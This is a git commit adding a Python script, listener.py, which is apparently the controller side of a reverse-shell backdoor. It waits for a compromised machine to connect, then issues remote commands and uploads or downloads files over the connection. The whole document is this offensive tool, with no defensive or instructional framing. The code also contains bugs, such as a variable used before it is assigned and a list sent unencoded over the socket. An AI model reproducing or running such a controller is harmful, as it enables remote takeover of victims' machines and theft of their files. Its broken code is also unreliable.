e08a7fa95ddadb91bde8ade2b25764172f6b6cbc
Springerstine <44124166+Springerstine@users.noreply.github.com>
2022-06-09 12:34:44 -0400

    Create listener.py

---
+++ listener.py
@@ -0,0 +1,58 @@
+
+import socket, json, base64, sys
+
+class Listener:
+   def __init__(self, ip , port):
+      listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+      listener.bind((ip, port))
+      listener.listen(0)
+      print("\n[+] Waiting for incoming connections...\n")
+      self.connection, address = listener.accept()
+      print("\n[+] Connection established with: " + str(address) + ".\n")
+
+   def reliable_send(self, data):
+      json_data = json.dumps(data)
+      self.connection.send(json_data)
+
+   def reliable_receive(self):
+      json_data = ""
+      while True:
+         try:
+            json_data = json_data + self.connection.recv(1024)
+            return json.loads(json_data)
+         except ValueError:
+            continue 
+
+   def execute(self, cmmd):
+      self.connection.send(cmmd)
+      if cmmd[0] == "close":
+         self.connection.close()
+         exit()
+      return self.connection.recv(1024)
+
+   def write_file(self, path, data):
+      with open(path, 'wb') as f:
+         f.write(base64.b64decode(data))
+         return "\n[+] Download successful.\n"
+
+   def read_file(self, path):
+      with open(path, "rb") as f:
+         return base64.b64encode(f.read())
+
+   def run(self):
+      while True:
+         cmmd = input(">> ")
+         cmmd = cmmd.split(" ")
+         if cmmd[0] == "upload":
+            file_content = self.read_file(cmmd[1])
+            cmmd.append(file_content)
+         elif cmmd[0] == "download":
+            result = self.write_file(cmmd[1], result)
+            
+         result = self.execute(cmmd)
+
+         print(result)
+
+Listener = Listener(str(sys.argv[1]), int(sys.argv[2]))
+Listener.run()
